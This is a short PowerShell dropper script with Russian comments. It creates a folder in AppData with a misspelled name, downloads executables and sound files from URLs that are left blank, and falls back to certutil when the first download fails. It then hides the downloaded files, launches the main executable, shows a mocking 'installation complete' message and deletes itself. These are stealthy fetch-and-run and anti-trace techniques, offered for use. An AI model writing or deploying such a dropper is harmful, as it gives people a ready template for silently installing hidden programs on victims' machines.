
$dest = "$env:APPDATA\chache"  # Папка установки
$files = @{
    "wind_alert.exe" = ""
    "sound.exe"      = ""
    "wind_alert.wav" = ""
    "hun.wav"        = ""
}
$mainExe = "$dest\wind_alert.exe"  # Главный исполняемый файл

# Создается папочка(не мамочка)
if (-not (Test-Path $dest)) {
    New-Item -Path $dest -ItemType Directory | Out-Null
}

# Качаю файлы из списка двумя способами
foreach ($file in $files.Keys) {
    $url = $files[$file]
    $path = Join-Path $dest $file
    try {
        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
    } catch {
        certutil -urlcache -split -f $url $path
    }
}

# Скрываем исполняемые файлы
Get-ChildItem -Path $dest | ForEach-Object {
    attrib +h $_.FullName
}

# И запускаем управляющий скрипт
Start-Process $mainExe

# Самоуничтажаемся
Start-Sleep -Seconds 1
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("Я удаляюсь, пока долбаебы", "Установка завершена")

# Задержка
Start-Sleep -Seconds 5
$scriptPath = $MyInvocation.MyCommand.Path
Remove-Item -Path $scriptPath -Force
